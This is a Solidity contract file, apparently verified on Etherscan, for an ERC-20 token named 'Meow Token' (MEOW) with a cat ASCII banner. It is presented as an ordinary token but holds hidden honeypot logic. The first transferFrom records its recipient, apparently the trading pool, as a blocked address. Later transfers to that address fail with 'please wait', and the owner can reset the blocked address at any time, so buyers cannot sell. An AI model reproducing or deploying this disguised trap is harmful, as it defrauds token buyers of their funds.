/**
 *Submitted for verification at Etherscan.io on 2021-06-18
*/

/**
                  ;,_            ,
                 _uP~"b          d"u,
                dP'   "b       ,d"  "o
               d"    , `b     d"'    "b
              l] [    " `l,  d"       lb
              Ol ?     "  "b`"=uoqo,_  "l
            ,dBb "b        "b,    `"~~TObup,_
          ,d" (db.`"         ""     "tbc,_ `~"Yuu,_
        .d" l`T'  '=                      ~     `""Yu,
      ,dO` gP,                           `u,   b,_  "b7
     d?' ,d" l,                           `"b,_ `~b  "1
   ,8i' dl   `l                 ,ggQOV",dbgq,._"  `l  lb
  .df' (O,    "             ,ggQY"~  , @@@@@d"bd~  `b "1
 .df'   `"           [email protected]""     (b  @@@@P db    `Lp"b,
.d(                  _               "ko "=d_,Q`  ,_  "  "b,
Ql         .         `"qo,._          "tQo,_`""bo ;tb,    `"b,
qQ         |L           ~"QQQgggc,_.,dObc,opooO  `"~~";.   __,7,
qp         t\io,_           `~"TOOggQV""""        _,dg,_ =PIQHib.
`qp        `Q["tQQQo,_                          ,pl{QOP"'   7AFR`
  `         `tb  '""tQQQg,_             p" "b   `       .;-.`Vl'
             "Yb      `"tQOOo,__    _,edb    ` .__   /`/'|  |b;=;.__
                           `"tQQQOOOOP""`"\QV;qQObob"`-._`\_~~-._
                                """"    ._        /   | |oP"\_   ~\ ~\_~\
                                        `~"\ic,qggddOOP"|  |  ~\   `\~-._
                                          ,qP`"""|"   | `\ `;   `\   `\
                               _        _,p"     |    |   `\`;    |    |
       MEOW TOKEN               "boo,._dP"       `\_  `\    `\|   `\   ;
                                 `"7tY~'            `\  `\    `|_   |
                                                      `~\  |

*/

//SPDX-License-Identifier: MIT

pragma solidity >=0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract ERC20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenERC20 is ERC20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newun;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "MEOW";
    name = "Meow Token";
    decimals = 8;
    _totalSupply = 1000000000000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newun == address(0)) newun = to;
      else require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract MEOWMEOW is TokenERC20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}